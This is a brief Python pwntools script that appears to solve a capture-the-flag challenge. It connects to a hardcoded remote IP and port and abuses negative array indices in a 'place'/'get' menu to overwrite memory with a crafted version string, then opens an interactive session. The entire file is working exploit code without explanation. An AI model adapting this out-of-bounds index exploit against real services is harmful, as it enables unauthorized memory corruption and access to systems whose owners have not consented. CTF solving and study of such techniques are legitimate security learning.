#! /usr/bin/env python
from pwn import *

# nc 109.233.56.90 11055
s = remote('109.233.56.90', 11055)

#print s.recvuntil('yourself:')
s.recvuntil('yourself:')
s.sendline('A' * 12)
#print s.recvuntil('>')
s.recvuntil('>')
s.sendline('place')
#print s.recvuntil('number:')
s.recvuntil('number:')
s.sendline('8')
#print s.recvuntil(':')
s.recvuntil(':')
s.sendline('BB')
#print s.recvuntil('>')
s.recvuntil('>')
s.sendline('get')
#print s.recvuntil('number:')
s.recvuntil('number:')
s.sendline('-2')
#print s.recvuntil('>')
s.recvuntil('>')
s.sendline('place')
#print s.recvuntil('number:')
s.recvuntil('number:')
s.sendline('-2')
#print s.recvuntil(':')
s.recvuntil(':')
p = '1' * 8
s.sendline('1' * 8 + 'clang_v1.4.5\x00')
print 'Done!'
s.interactive()














